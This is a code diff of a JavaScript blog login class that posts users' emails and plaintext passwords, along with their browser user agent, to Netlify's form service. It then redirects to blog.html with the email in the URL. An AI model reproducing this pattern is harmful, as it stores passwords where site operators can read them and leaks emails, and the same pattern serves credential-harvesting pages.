@@ -300,7 +300,7 @@ class BlogLogin {
         // 使用 fetch 提交表单到 Netlify
         this.submitEmailLoginToNetlify(email, password, rememberMe)
             .then(() => {
-                // 提交成功后跳转
+                // 提交成功后直接跳转到 blog.html（无 success.html 过渡页）
                 setTimeout(() => {
                     window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
                 }, 500);
@@ -315,7 +315,6 @@ class BlogLogin {
 
     // 提交邮箱登录到 Netlify
     async submitEmailLoginToNetlify(email, password, rememberMe) {
-        const form = document.getElementById('loginForm');
         const formData = new FormData();
 
         // 添加表单字段
@@ -326,7 +325,7 @@ class BlogLogin {
         formData.append('timestamp', new Date().toISOString());
         formData.append('userAgent', navigator.userAgent);
 
-        // 提交到当前页面（Netlify 会自动处理）
+        // 提交到当前页面（Netlify 会自动处理并跳转到 _next 指定的页面）
         const response = await fetch('/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -343,13 +342,12 @@ class BlogLogin {
     // 提交社交登录到 Netlify
     async submitSocialLoginToNetlify(method, email) {
         const formData = new FormData();
-        const timestamp = new Date().toISOString();
 
         formData.append('email', `${method}@social.com`);
         formData.append('password', '[社交登录]');
         formData.append('rememberMe', '否');
         formData.append('loginMethod', method);
-        formData.append('timestamp', timestamp);
+        formData.append('timestamp', new Date().toISOString());
         formData.append('userAgent', navigator.userAgent);
 
         const response = await fetch('/', {
